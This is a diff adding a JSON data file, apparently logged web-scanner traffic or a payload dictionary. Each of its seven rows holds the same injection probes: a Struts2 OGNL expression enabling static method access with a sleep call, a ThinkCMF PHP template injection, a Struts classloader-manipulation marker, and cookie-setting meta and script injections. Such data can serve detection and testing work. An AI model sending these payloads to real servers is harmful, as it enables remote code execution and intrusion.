@@ -1,0 +1,75 @@
+{
+ "parameters": [
+  {
+   "name": "_meta_http_equiv",
+   "uuid": "4d9cae5a-298b-4c22-8457-2b4f5e887bc2"
+  },
+  {
+   "name": "_script_document_cookie",
+   "uuid": "9128efe0-2a05-4756-974c-9bcee10aa252"
+  },
+  {
+   "name": "class_classLoader_URLs_0_",
+   "uuid": "a4618f71-6030-47c3-910d-2836357a89cb"
+  },
+  {
+   "name": "content",
+   "uuid": "ee2c85d0-6b19-4fa4-b802-285e6c0532f4"
+  },
+  {
+   "name": "expression",
+   "uuid": "1218a0de-8c51-4b04-a0a0-b89ed524f858"
+  }
+ ],
+ "rows": [
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testcgtp=579\">",
+   "_script_document_cookie": "\"testcgtp=579",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  },
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testcgtp=579\">",
+   "_script_document_cookie": "\"testfeim=9745",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  },
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testtnfh=9688\">",
+   "_script_document_cookie": "\"testtnfh=9688",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  },
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testobnn=9888\">",
+   "_script_document_cookie": "\"testobnn=9888",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  },
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testmtpq=6410\">",
+   "_script_document_cookie": "\"testmtpq=6410",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  },
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testeinu=2205\">",
+   "_script_document_cookie": "\"testeinu=2205",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1605657696",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  },
+  {
+   "_meta_http_equiv": "Set-Cookie content=\"testytkt=3037\">",
+   "_script_document_cookie": "\"testytkt=3037",
+   "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1605658394",
+   "content": "<php>die(@md5(HelloThinkCMF))</php>",
+   "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+  }
+ ]
+}
